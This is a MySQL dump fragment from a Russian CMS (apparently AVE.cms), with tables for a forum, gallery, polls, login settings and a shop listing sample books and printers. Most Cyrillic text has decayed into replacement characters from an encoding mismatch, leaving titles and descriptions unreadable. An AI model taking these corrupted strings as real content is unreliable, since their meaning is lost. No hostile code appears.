INSERT INTO `cp_modul_forum_topic` VALUES (1, '����� ����������!', 0, 57, NULL, 1, NULL, 0, '2008-05-10 11:45:16', 5, 1, '', 0, '2010-03-26 04:16:56', NULL, 1, 1269566216);
INSERT INTO `cp_modul_forum_topic` VALUES (2, '��������', 0, 134, NULL, 2, NULL, 0, '2009-01-09 11:59:20', 2, 1, '', 0, '2009-01-09 12:03:06', NULL, 1, 1231491786);
INSERT INTO `cp_modul_forum_topic` VALUES (3, '����������', 0, 3, NULL, 2, NULL, 0, '2009-01-09 12:08:28', 1, 1, '', 1, '2009-01-09 12:08:28', NULL, 1, 1231492108);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_topic_read`
-- 

CREATE TABLE `cp_modul_forum_topic_read` (
  `Usr` int(11) NOT NULL default '0',
  `Topic` int(11) NOT NULL default '0',
  `ReadOn` timestamp NOT NULL default CURRENT_TIMESTAMP on update CURRENT_TIMESTAMP,
  PRIMARY KEY  (`Usr`,`Topic`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_topic_read`
-- 

INSERT INTO `cp_modul_forum_topic_read` VALUES (1, 2, '2010-05-03 05:39:32');
INSERT INTO `cp_modul_forum_topic_read` VALUES (1, 1, '2010-06-23 13:49:08');
INSERT INTO `cp_modul_forum_topic_read` VALUES (1, 3, '2010-05-02 22:52:49');
INSERT INTO `cp_modul_forum_topic_read` VALUES (0, 1, '2010-01-11 04:38:16');
INSERT INTO `cp_modul_forum_topic_read` VALUES (0, 2, '2010-05-03 05:37:52');
INSERT INTO `cp_modul_forum_topic_read` VALUES (2, 2, '2010-05-03 05:38:25');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_useronline`
-- 

CREATE TABLE `cp_modul_forum_useronline` (
  `ip` char(25) NOT NULL default '0',
  `uid` int(10) unsigned NOT NULL default '0',
  `expire` int(10) NOT NULL default '0',
  `uname` char(255) NOT NULL,
  `invisible` char(10) NOT NULL,
  UNIQUE KEY `ip` (`ip`),
  KEY `expire` (`expire`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_useronline`
-- 

INSERT INTO `cp_modul_forum_useronline` VALUES ('127.0.0.1', 1, 1277287118, 'Admin', '0');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_userprofile`
-- 

CREATE TABLE `cp_modul_forum_userprofile` (
  `Id` int(14) unsigned NOT NULL auto_increment,
  `BenutzerId` int(14) unsigned NOT NULL default '0',
  `BenutzerName` varchar(200) default NULL,
  `BenutzerNameChanged` mediumint(3) unsigned default '0',
  `GroupIdMisc` text,
  `Beitraege` int(10) unsigned NOT NULL default '0',
  `ZeigeProfil` tinyint(1) unsigned NOT NULL default '1',
  `Signatur` tinytext,
  `Icq` varchar(150) default NULL,
  `Aim` varchar(150) default NULL,
  `Skype` varchar(150) default NULL,
  `Emailempfang` tinyint(1) unsigned NOT NULL default '1',
  `Pnempfang` tinyint(1) unsigned NOT NULL default '1',
  `Avatar` varchar(255) default NULL,
  `AvatarStandard` tinyint(1) NOT NULL default '1',
  `Webseite` varchar(255) default NULL,
  `Unsichtbar` tinyint(1) unsigned NOT NULL default '1',
  `Interessen` text,
  `Email` varchar(200) default NULL,
  `reg_time` int(10) unsigned NOT NULL default '0',
  `GeburtsTag` varchar(10) default NULL,
  `Email_show` tinyint(1) unsigned NOT NULL default '0',
  `Icq_show` tinyint(1) unsigned NOT NULL default '1',
  `Aim_show` tinyint(1) unsigned NOT NULL default '1',
  `Skype_show` tinyint(1) unsigned NOT NULL default '1',
  `Interessen_show` tinyint(1) unsigned NOT NULL default '1',
  `Signatur_show` tinyint(1) unsigned NOT NULL default '1',
  `GeburtsTag_show` tinyint(1) unsigned NOT NULL default '1',
  `Webseite_show` tinyint(1) unsigned NOT NULL default '1',
  `Geschlecht` enum('male','female') NOT NULL default 'male',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `BenutzerId` (`BenutzerId`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_modul_forum_userprofile`
-- 

INSERT INTO `cp_modul_forum_userprofile` VALUES (1, 1, 'Admin', 0, '', 8, 1, '', '', '', '', 1, 1, '', 0, '', 0, '', 'formsg@mail.ru', 1250295071, '', 0, 1, 1, 1, 1, 1, 1, 1, 'male');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_gallery`
-- 

CREATE TABLE `cp_modul_gallery` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `gallery_title` varchar(255) NOT NULL,
  `gallery_description` text NOT NULL,
  `gallery_author_id` int(10) unsigned NOT NULL default '1',
  `gallery_created` int(10) unsigned NOT NULL default '0',
  `gallery_thumb_width` smallint(3) unsigned NOT NULL default '120',
  `gallery_image_on_line` tinyint(1) unsigned NOT NULL default '4',
  `gallery_title_show` enum('1','0') NOT NULL default '1',
  `gallery_description_show` enum('1','0') NOT NULL default '1',
  `gallery_image_size_show` enum('0','1') NOT NULL default '0',
  `gallery_type` tinyint(1) unsigned NOT NULL default '4',
  `gallery_image_on_page` tinyint(1) unsigned NOT NULL default '12',
  `gallery_watermark` varchar(255) NOT NULL,
  `gallery_folder` varchar(255) NOT NULL,
  `gallery_orderby` enum('datedesc','dateasc','titleasc','titledesc','position') NOT NULL default 'datedesc',
  `gallery_script` text NOT NULL,
  `gallery_image_template` text NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_modul_gallery`
-- 

INSERT INTO `cp_modul_gallery` VALUES (1, '���������������� �������', '��� ������� ������� ��� ������������ � ������������� ������', 1, 1250295071, 120, 4, '1', '1', '', 7, 12, 'watermark.gif', '', 'position', '<script src="/cms/modules/gallery/templates/js/clearbox.js?lng=ru&dir=/cms/modules/gallery/templates/js/clearbox" type="text/javascript"></script>', '<a href="/cms/modules/gallery/uploads/[tag:gal:folder][tag:img:filename]" rel="clearbox[gallery=���������������� �������,,comment=[tag:img:description]]" title="[tag:img:title]"><img src="[tag:img:thumbnail]" /></a>');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_gallery_images`
-- 

CREATE TABLE `cp_modul_gallery_images` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `gallery_id` int(10) unsigned NOT NULL default '0',
  `image_filename` varchar(255) NOT NULL,
  `image_author_id` int(10) unsigned NOT NULL default '0',
  `image_title` varchar(255) NOT NULL,
  `image_description` text NOT NULL,
  `image_file_ext` char(4) NOT NULL,
  `image_date` int(10) unsigned NOT NULL default '0',
  `image_position` smallint(3) unsigned NOT NULL default '1',
  PRIMARY KEY  (`id`),
  KEY `image_position` (`image_position`),
  KEY `image_date` (`image_date`),
  KEY `gallery_id` (`gallery_id`),
  KEY `image_title` (`image_title`)
) ENGINE=MyISAM AUTO_INCREMENT=62 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_modul_gallery_images`
-- 

INSERT INTO `cp_modul_gallery_images` VALUES (1, 1, 'crocodile.jpg', 1, '��������', '', '.jpg', 1250295071, 1);
INSERT INTO `cp_modul_gallery_images` VALUES (2, 1, 'dolphin.jpg', 1, '�������', '', '.jpg', 1250295071, 1);
INSERT INTO `cp_modul_gallery_images` VALUES (3, 1, 'duck.jpg', 1, '����', '', '.jpg', 1250295071, 1);
INSERT INTO `cp_modul_gallery_images` VALUES (4, 1, 'eagle.jpg', 1, '����', '', '.jpg', 1250295071, 7);
INSERT INTO `cp_modul_gallery_images` VALUES (5, 1, 'jellyfish.jpg', 1, '������', '', '.jpg', 1250295071, 1);
INSERT INTO `cp_modul_gallery_images` VALUES (6, 1, 'killer_whale.jpg', 1, '�������', '', '.jpg', 1250295071, 6);
INSERT INTO `cp_modul_gallery_images` VALUES (7, 1, 'leaf.jpg', 1, '����', '', '.jpg', 1250295071, 1);
INSERT INTO `cp_modul_gallery_images` VALUES (8, 1, 'spider.jpg', 1, '����', '', '.jpg', 1250295071, 5);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_login`
-- 

CREATE TABLE `cp_modul_login` (
  `Id` tinyint(1) unsigned NOT NULL auto_increment,
  `login_reg_type` enum('now','email','byadmin') NOT NULL default 'now',
  `login_antispam` enum('0','1') NOT NULL default '0',
  `login_status` enum('1','0') NOT NULL default '1',
  `login_deny_domain` text NOT NULL,
  `login_deny_email` text NOT NULL,
  `login_require_company` enum('0','1') NOT NULL default '0',
  `login_require_firstname` enum('0','1') NOT NULL default '0',
  `login_require_lastname` enum('0','1') NOT NULL default '0',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_login`
-- 

INSERT INTO `cp_modul_login` VALUES (1, 'email', '0', '1', 'domain.ru', 'name@domain.ru', '0', '0', '0');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_newsarchive`
-- 

CREATE TABLE `cp_modul_newsarchive` (
  `id` mediumint(5) unsigned NOT NULL auto_increment,
  `newsarchive_name` char(100) NOT NULL default '',
  `newsarchive_rubrics` char(255) NOT NULL default '',
  `newsarchive_show_days` enum('1','0') NOT NULL default '1',
  `newsarchive_show_empty` enum('1','0') NOT NULL default '1',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_modul_newsarchive`
-- 

INSERT INTO `cp_modul_newsarchive` VALUES (1, '������ �����', '1,2,3', '1', '1');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_poll`
-- 

CREATE TABLE `cp_modul_poll` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `poll_title` varchar(255) NOT NULL default '',
  `poll_status` enum('1','0') NOT NULL default '1',
  `poll_can_comment` enum('0','1') NOT NULL default '0',
  `poll_groups_id` tinytext,
  `poll_start` int(10) unsigned NOT NULL default '0',
  `poll_end` int(10) unsigned NOT NULL default '0',
  `poll_users_id` text NOT NULL,
  `poll_users_ip` text NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_poll`
-- 

INSERT INTO `cp_modul_poll` VALUES (1, '�������� �����', '1', '1', '1,2,3,4', 1278366240, 1309902240, '', '127.0.0.1');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_poll_comments`
-- 

CREATE TABLE `cp_modul_poll_comments` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `poll_id` int(10) NOT NULL,
  `poll_comment_author_id` int(10) NOT NULL,
  `poll_comment_author_ip` text NOT NULL,
  `poll_comment_time` int(10) unsigned NOT NULL default '0',
  `poll_comment_title` varchar(250) NOT NULL default '',
  `poll_comment_text` text NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_poll_comments`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_poll_items`
-- 

CREATE TABLE `cp_modul_poll_items` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `poll_id` int(10) NOT NULL,
  `poll_item_title` varchar(250) NOT NULL default '',
  `poll_item_hits` int(10) NOT NULL default '0',
  `poll_item_color` varchar(10) NOT NULL default '',
  `poll_item_position` int(2) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_poll_items`
-- 

INSERT INTO `cp_modul_poll_items` VALUES (1, 1, '������', 24, '#FF0000', 1);
INSERT INTO `cp_modul_poll_items` VALUES (2, 1, '������', 12, '#00FF00', 2);
INSERT INTO `cp_modul_poll_items` VALUES (3, 1, '������', 35, '#0000FF', 3);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_search`
-- 

CREATE TABLE `cp_modul_search` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `search_query` char(255) NOT NULL,
  `search_count` mediumint(5) unsigned NOT NULL default '0',
  `search_found` mediumint(5) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `search_query` (`search_query`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_modul_search`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop`
-- 

CREATE TABLE `cp_modul_shop` (
  `Id` tinyint(1) unsigned NOT NULL auto_increment,
  `status` enum('0','1') NOT NULL default '0',
  `Waehrung` varchar(10) NOT NULL default 'RUR',
  `WaehrungSymbol` varchar(10) NOT NULL default '���.',
  `Waehrung2` varchar(10) NOT NULL default 'EUR',
  `WaehrungSymbol2` varchar(10) NOT NULL default '&euro;',
  `Waehrung2Multi` decimal(10,4) NOT NULL default '1.0000',
  `ShopLand` char(2) NOT NULL default 'RU',
  `ArtikelMax` mediumint(3) unsigned NOT NULL default '10',
  `KaufLagerNull` tinyint(1) unsigned NOT NULL default '0',
  `VersandLaender` tinytext NOT NULL,
  `VersFrei` tinyint(1) unsigned NOT NULL default '0',
  `VersFreiBetrag` decimal(7,2) NOT NULL default '0.00',
  `GutscheinCodes` tinyint(1) unsigned NOT NULL default '1',
  `ZeigeEinheit` tinyint(1) unsigned NOT NULL default '1',
  `ZeigeNetto` tinyint(1) NOT NULL default '1',
  `KategorienStart` tinyint(1) unsigned NOT NULL default '1',
  `KategorienSons` tinyint(1) unsigned NOT NULL default '1',
  `ZufallsAngebot` tinyint(1) unsigned NOT NULL default '1',
  `ZufallsAngebotKat` tinyint(1) unsigned NOT NULL default '1',
  `BestUebersicht` tinyint(1) unsigned NOT NULL default '1',
  `Merkliste` tinyint(1) unsigned NOT NULL default '1',
  `Topseller` tinyint(1) unsigned NOT NULL default '1',
  `TemplateArtikel` varchar(100) NOT NULL default '',
  `Vorschaubilder` mediumint(3) NOT NULL default '80',
  `Topsellerbilder` mediumint(3) NOT NULL default '40',
  `GastBestellung` tinyint(1) unsigned default '0',
  `Kommentare` tinyint(1) unsigned default '1',
  `KommentareGast` tinyint(1) NOT NULL default '0',
  `ZeigeWaehrung2` tinyint(1) unsigned default '0',
  `ShopKeywords` varchar(255) default '',
  `ShopDescription` varchar(255) default '',
  `required_intro` tinyint(1) unsigned default '1',
  `required_desc` tinyint(1) unsigned default '1',
  `required_price` tinyint(1) unsigned default '1',
  `required_stock` tinyint(1) unsigned default '1',
  `company_name` varchar(255) default '',
  `custom` int(10) unsigned NOT NULL,
  `delivery` int(10) unsigned default '0',
  `delivery_local` int(10) unsigned default '0',
  `downloadable` int(10) unsigned default '0',
  `track_label` tinyint(1) unsigned default '0',
  `ShopWillkommen` text NOT NULL,
  `ShopFuss` text NOT NULL,
  `VersandInfo` text NOT NULL,
  `DatenschutzInf` text NOT NULL,
  `Impressum` text NOT NULL,
  `Agb` text NOT NULL,
  `AdresseText` text NOT NULL,
  `AdresseHTML` text NOT NULL,
  `Logo` varchar(255) NOT NULL default '',
  `EmailFormat` enum('text','html') NOT NULL default 'text',
  `AbsEmail` varchar(255) NOT NULL default '',
  `AbsName` varchar(255) NOT NULL default '',
  `EmpEmail` varchar(255) NOT NULL default '',
  `BetreffBest` varchar(255) NOT NULL default '',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop`
-- 

INSERT INTO `cp_modul_shop` VALUES (1, '1', 'RUR', '�', 'EUR', '�', 1.0000, 'RU', 10, 0, 'BY,RU,UA', 0, 0.00, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 'shop_items.tpl', 80, 40, 1, 1, 1, 0, '', '', 1, 1, 1, 1, 'AVE.cms', 3, 1, 1, 4, 0, '<h2 id="page-heading">��� ������ �������������� �������� ������ �������&nbsp;</h2>\r\n<p>���� ����� ������ � ������� � ������� <strong>������</strong> &raquo; <strong>�������</strong> &raquo; <strong>�������� ������</strong> &raquo; <strong>����� �����������</strong>.</p>', '<p>���� ����� ������ � ������� � ������� <strong>������</strong> &raquo; <strong>�������</strong>  &raquo; <strong>�������� ������</strong> &raquo; <strong>���������� � ������ ����� ��������</strong>.</p>', '<h2 id="page-heading">�������� � ��������</h2>\r\n<p>���� ����� ������ � ������� � ������� <strong>������</strong> &raquo; <strong>�������</strong>  &raquo; <strong>�������� ������</strong> &raquo; <strong>�������� � ��������</strong>.</p>', '<h2 id="page-heading">��������� ������</h2>\r\n<p>���� ����� ������ � ������� � ������� <strong>������</strong> &raquo; <strong>�������</strong>  &raquo; <strong>�������� ������</strong> &raquo; <strong>��������� ������</strong>.</p>', '<h2 id="page-heading">� ��������</h2>\r\n<p>���� ����� ������ � ������� � ������� <strong>������</strong> &raquo; <strong>�������</strong>  &raquo; <strong>�������� ������</strong> &raquo; <strong>� ��������</strong>.</p>', '<p>���� ����� ������ � ������� � ������� <strong>������</strong> &raquo; <strong>�������</strong>  &raquo; <strong>�������� ������</strong> &raquo; <strong>������������ ����������</strong>.</p>', '', '', '', 'text', '', '', '', '');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_artikel`
-- 

CREATE TABLE `cp_modul_shop_artikel` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `ArtNr` varchar(200) NOT NULL,
  `KatId` int(10) unsigned NOT NULL default '0',
  `KatId_Multi` text NOT NULL,
  `ArtName` varchar(255) NOT NULL,
  `status` smallint(1) unsigned NOT NULL default '1',
  `Preis` decimal(10,2) NOT NULL default '0.00',
  `PreisListe` decimal(10,2) NOT NULL default '0.00',
  `Bild` varchar(255) NOT NULL,
  `Bild_Typ` varchar(10) NOT NULL default 'jpg',
  `Bilder` text NOT NULL,
  `TextKurz` text NOT NULL,
  `TextLang` text NOT NULL,
  `Gewicht` decimal(6,3) NOT NULL default '0.000',
  `Angebot` tinyint(1) unsigned NOT NULL default '0',
  `AngebotBild` varchar(255) NOT NULL,
  `UstZone` smallint(2) unsigned NOT NULL default '1',
  `Erschienen` int(14) unsigned NOT NULL default '0',
  `Frei_Titel_1` varchar(100) NOT NULL,
  `Frei_Text_1` text NOT NULL,
  `Frei_Titel_2` varchar(100) NOT NULL,
  `Frei_Text_2` text NOT NULL,
  `Frei_Titel_3` varchar(100) NOT NULL,
  `Frei_Text_3` text NOT NULL,
  `Frei_Titel_4` varchar(100) NOT NULL,
  `Frei_Text_4` text NOT NULL,
  `Hersteller` mediumint(5) NOT NULL,
  `Schlagwoerter` tinytext NOT NULL,
  `Einheit` decimal(7,2) NOT NULL default '0.00',
  `EinheitId` int(10) unsigned NOT NULL default '0',
  `Lager` int(10) unsigned NOT NULL default '0',
  `VersandZeitId` smallint(2) unsigned NOT NULL default '1',
  `Bestellungen` int(10) unsigned NOT NULL default '0',
  `DateiDownload` varchar(255) NOT NULL,
  `PosiStartseite` smallint(2) unsigned NOT NULL default '1',
  `ProdKeywords` varchar(255) NOT NULL default '',
  `ProdDescription` varchar(255) NOT NULL default '',
  `country_of_origin` varchar(255) NOT NULL default '',
  `bid` int(5) unsigned NOT NULL default '0',
  `cbid` int(5) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `ArtNr` (`ArtNr`),
  KEY `KatId` (`KatId`),
  KEY `ArtName` (`ArtName`),
  KEY `Hersteller` (`Hersteller`),
  KEY `Preis` (`Preis`),
  KEY `Erschienen` (`Erschienen`),
  KEY `Bestellungen` (`Bestellungen`),
  KEY `Angebot` (`Angebot`),
  FULLTEXT KEY `Schlagwoerter` (`Schlagwoerter`)
) ENGINE=MyISAM AUTO_INCREMENT=18 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_modul_shop_artikel`
-- 

INSERT INTO `cp_modul_shop_artikel` VALUES (7, 'BUCH_0002', 5, '27', '��������� �� ����������� � ��� ��������-�������������� ��������� 2-� ���', 1, 40.00, 0.00, 'book_2.jpg', 'jpg', '', '<p>2-� �������, 2007 ���, 128 ���., ������ 13x20 �� (84�108/32), ������ �������, ISBN 978-5-469-01664-9</p>', '<p>� ������������ ������� ������������ ��������� ������������ ���������� &laquo;����������� � ���&raquo; � ����� � 5-�� �� 11-� ����� �� ������ ��������-�������������� ���������. � ��������� ��������� ����������� ������������ ���� ���������� � ����� � ���������� ���������������� ���������������� ��������� �� � ������ ������ � ������ ���������� �����. �������� �������� ��������� ��������-�������������� ���������, �� ������ ������� ������� ��������. ���������� ����, ����������� ������������ � ���������� ��� ���� ������� ��������: ���������� � �������� ����� � �������� � ������� �����. ��������� ������������ ������������ ��� ���� ������� ��������.<br />\r\n������������ ���������� ������ ��������� ������������ ������ ������-������������ �������� �� ������ ��������� � ������� ������� &laquo;����������� � ���&raquo; ��� ��������� ����. �. �. ��������� ��� �������� � ���� ������������ ������� ��� ��������.<br />\r\n������������� �������������� ���� � �������������� �����, ���������� ���� �������, ������� ����������.</p>\r\n<p></p>', 0.500, 0, '', 1, 1148068800, '�� ������', '<p>�������� ������� ������������ &mdash; ����������� �������� ������ ����� ���������� ���������, ���������� �������� �������������� ������ � ����������, �������� ��� ��, ���������, ������ �������������� ����, �������� ����������� ����. ��������  �. �. ����� �������������� ������� � �������������.<br />\r\n<br />\r\n������������� ����������� &laquo;International Soros Science Education Program&raquo; ��������� �� ������ &laquo;����������� ���������&raquo;. ������� ������������ ����� ����� 200 ���������� ����� ������� �����, ������, ������-������������ ����������.<br />\r\n<br />\r\n� 1997 �. �� ��������� ����� ���������  �. �. ������� ���������� ������ ��� ���������� �� ����������� ��� ����, ����������� ������� �������� �������� � ������������ &laquo;�����&raquo; ������-������������ �������� �� 11-�� ������������, ������� ���� ������������ ����������� ��.</p>', '', '&nbsp;', '', '&nbsp;', '', '&nbsp;', 2, '�����', 0.00, 0, 1000, 1, 0, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (6, 'CP-10056', 1, '1,25', 'Epson Stylus Photo R1900', 1, 72.00, 0.00, 'epson.jpg', 'jpg', '', '<p>������ ���������� �� �3+. ������ �� �������� ������ �3 � �3+. &nbsp;���������� 5760 x 1440 dpi. &nbsp;������� Epson UltraChrome Hi-Gloss2, 8 ������. &nbsp;���������� �������� ����������� �� 80 ���</p>\r\n<p></p>', '<p>EPSON Stylus Photo R1900 - �������������� ������� ������� �3+, ����������� �������� ��������������� ���������� EPSON � ������� �������� ���������� � ���������� ����� ������������� ����������� ���������������� ���������� � ������� �������������.&nbsp;<br />\r\n<br />\r\n��������� ����� ������������� ������� ������ ����������� ��������� Ultra Chrome Hi-Gloss2 ������� ������������� ����������� ������� �������� �����, ����������� �������� ����� ������������ ������� ����������. ��� ���� �������������� ������ ��������� 100 ���*, ��� ����������� ����������� ���������� ����������.&nbsp;<br />\r\n<br />\r\n������� ������������ ������ �� ����� ��������� ���������, � ��� ����� �� �������� ������ � �������-������. ������������� ������ ���������� ���������� ������� ������������� ������. ������� �������� ������ � ������ ������� ���� ������ ��� ����������� ��������� ���������������� ����������.&nbsp;<br />\r\n<br />\r\n����� ���������� ������� EPSON UltraChrome Hi-Gloss2<br />\r\n� �������� EPSON Stylus Photo R1900 ������������ ����� ���������� ������� EPSON Ultra Chrome Hi-Gloss2, ������������� ���������� ��� ���������������� ����������. ������������ ��������������� �������� ������ ����������, ����������� ������� ��������� � ������� ������������ � ������� �������� �����, ����������� ������������� ����� ���������� ������ � �������������� ���������� �������.</p>', 2.000, 1, '/uploads/images/adv_epson.gif', 1, 1148068800, '��������������', '<p></p>\r\n<ul>\r\n    <li>����� ���������� ������� Epson Ultra Chrome Hi-Gloss2 - �������������� ����� 100 ���*</li>\r\n    <li>������������� ������� ��� ����������� �������� ��������� ������</li>\r\n    <li>��������� ��������� ��� ������ �������� �������� �����</li>\r\n    <li>���������� ����������� ������ - ��� ��������� �������� ������ �� ��������� ���������</li>\r\n    <li>��� ��������� ��������� � ���������</li>\r\n    <li>���������� �������� ���������� � ����������� �� 5760 � 1440 dpi</li>\r\n    <li>��������� ������ ���������� ����� &ndash; 1.5 ���������</li>\r\n    <li>����� ������� �������������� (LUT &ndash; Look Up Table)</li>\r\n    <li>������ ���������� ��� ����� &ndash; �� �������� � �������� ������</li>\r\n    <li>������ �� �������������� ���������</li>\r\n    <li>������ ���������� ����������</li>\r\n    <li>������ �� CD/DVD/MCD</li>\r\n    <li>��� ����� USB Hi-Speed (USB 2.0)</li>\r\n    <li>������ ������ ����� PictBridge</li>\r\n    <li>��� ���� � �������</li>\r\n</ul>\r\n<p></p>', '', '', '', '&nbsp;', '', '&nbsp;', 1, '�������', 0.00, 0, 999, 1, 12, '', 1, '', '', '', 0, 0);
INSERT INTO `cp_modul_shop_artikel` VALUES (5, 'CP-10055', 1, '1,25', 'Canon PIXMA PIXMA MP620', 1, 94.00, 0.00, 'pixima_2.jpg', 'jpg', '', '<p>�����������, ������������ � ������. ������ ������ � �����, ���� ������, 35-�� ���������/������� � ��������� ���������, ��������������� �������� �� ������� TFT-������� 8,8 ��, Wi-Fi � Ethernet</p>', '<p>�������� Canon ��������� ����� ������� PIXMA &laquo;�� � �����&raquo;, ������� � ����������� � ����, � ������������������� ���������� ������ ��� ����������� �������������� ������������������ � ������������ ����������� ���� � ��������. PIXMA MP620 &ndash; ��������� ������� ��� ���, ���� ���������� ������� ������, ������������ � ����������� �������� ��������. � ������������� �� ����������� Wi-Fi � Ethernet ��������� ���� ����� ����������� ������������ ������� �������� � ����� ����.<br />\r\n<br />\r\n<b>������������ �������� ������</b><br />\r\n<br />\r\n������� PIXMA MP620 ���������� �������������� ���������, ��������������� ���������� �������� � ������� ������� �������������� ������������. ��������� ������������������� ������� Canon ChromaLife100+, �������� �������, ��������� �� ���������� FINE, ������ ����� 1�� � ���������� 9600 ����� ����� �������� ���������� � ����� ������� ��������� � ��� �����������. �������� ������ ��������� ������, ��� ��������� �������� ��������� ������������� ����������������� �������� �������� 10�15 �� �������� �� 41 �������.<br />\r\n<br />\r\n�������� �������� ����������� ����������� ��������� ������� ���������� ���������� � ����� �������� ������, �������������� ������� �������� �������, ������������ ������� ������� � ����� ������� ��������. ��������� ������ ������, ���������� � ������ ����� �� ������ ��������� � ������� ��������� �� ������ �������� � ���������� ����������� ������������ �������� ����������, � ����� �������� ������ ��� ������ ����������. ������� ���������� ���������� ������������ ������ ������ � ������������� ������.<strong><br />\r\n<br />\r\n</strong></p>', 2.000, 0, '', 1, 1148068800, '��������������', '<p><b>������� ��������:</b>		�����������, ������������ � ������. ������ ������ � �����, ���� ������, 35-�� ���������/������� � ��������� ���������, ��������������� �������� �� ������� TFT-������� 8,8 ��, Wi-Fi � Ethernet</p>\r\n<p><b>������� �������� </b></p>\r\n<p>���������� ��� ������		�� 96001 x 2400 ����� �� ����<br />\r\n������ ������		5-������� ������� �������� ������, ����� ����� 1 ��, ������� ����������, ���������� �������, ��������� �� ���������� FINE, ���������� ContrastPLUS<br />\r\n�������� ����������		������ &quot;� ����&quot; (��� �����), ������ 10 x 15 ��: �����. 41 � (� ����������� ������)<br />\r\n�������� ����������� ������		�� 26 ���./��� (����.), 13,2 ���./��� (� ����������� ������)<br />\r\n�������� ������� ������		����� � �������: �� 18 ���./��� (����.), 10,9 ���./��� (� ����������� ������)<br />\r\n������������ ���������		���������� ���������� ���������� (Single Ink) &ndash; 6 ���������� ���������� (PGI-520BK, CLI-521C, CLI-521M, CLI-521Y, CLI-521BK, CLI-521GY)<br />\r\n��� ��������� ��� ������		������� ������, ��������, ���������������� ���������� Photo Paper Pro Platinum (PT-101), Photo Paper Pro II (PR-201), ��������� ���������� Photo Paper Plus Glossy II (PP-201), ����������� ���������� Photo Paper Plus Semi-gloss (SG-201), ��������� ������ ��� ������������ ���������� Glossy Photo Paper &quot;Everyday Use&quot; (GP-501), ������� ���������� Matte Photo Paper (MP-101), ������ ��� ������ � ������� ����������� High Resolution Paper (HR-101N), �������� ��� ������������� ����������� �� ����� (TR-301), ������������ (PS-101), ���������� ��� ���������������� ������ Fine Art Paper &quot;Photo Rag&quot; (FA-PR1), ����������� ������������� ������ ����� ������������������ ������.<br />\r\n������ ��������� ��� ������		������ �����: ����. 150 ������ �������� �����: ����. 150 ������<br />\r\n������ ��������� ��� ������		������ �����: A4, B5, A5, Letter, Legal, �������� (������ DL ��� Commercial 10), 10 x 15 ��, 10 x 18 ��, 13 x 18 ��, 20 x 25 ��, ������ ��������� ����� (54 � 86 ��)<br />\r\n�������: A4, B5, A5, Letter<br />\r\n��������� ��������� ��� ������		������ �����: ������� ������: 64 &ndash; 105 �/�&sup2; � ��������������� Canon ����������� ��������� ��� ������ ���������� �� 300 �/�&sup2; �������: ������� ������: 64 &ndash; 105 �/�&sup2;<br />\r\n������������ ������		� ������ ������ �� ������� ������ ������� A4, B5, A5, Letter � 13 x 18 �� (������ ��� Windows)<br />\r\n������ &quot;� ����&quot; (��� �����)		���� (A4, Letter, 20 x 25 ��, 13 x 18 ��, 10 x 15 ��)<br />\r\n��������� ��� ����������� � ������		���� Direct Print: ������ ������ ���������� � �������� ����- � ����������, ����������� �� ���������� PictBridge<br />\r\n������ ������ � ���� ������		CompactFlash, Microdrive, Memory Stick, Memory Stick Pro, Memory Stick Duo, Memory Stick PRO Duo, SD Memory Card, SDHC Memory Card, MultiMedia Card (Ver4.1) � MultiMedia Card Plus 